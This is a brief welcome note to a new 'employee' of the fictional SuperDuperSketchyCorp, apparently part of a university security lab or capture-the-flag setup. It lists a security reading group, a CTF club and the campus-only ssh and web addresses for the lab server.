Hello New Employee!

Welcome to your first day on the job at SuperDuperSketchyCorp!

We have weekly security reading group at 12:30pm on Tuesdays in the stained
glass room on the 3rd floor of BBB. You are expected to read the weekly paper
before attending. You can sign up for the mailing list here:
https://mcommunity.umich.edu/#group:security-reading

We also have weekly Capture the Flag Club meetings from 4:30-6:00pm on Fridays
in BBB 3901. You can sign up for announcements related to the club here:
https://mcommunity.umich.edu/#group:Wolverine%20Capture%20The%20Flag%20Club

If you need to connect to this server from a university device instead of
through our wireless access point, you can ssh to this server at
superdupersketchycorp.com on tcp port 47923 and access the web server at
www.superdupersketchycorp.com. You will not be able to access the server
from outside the UM campus networks.

Welcome to the team. I'm sure you'll be very happy here.
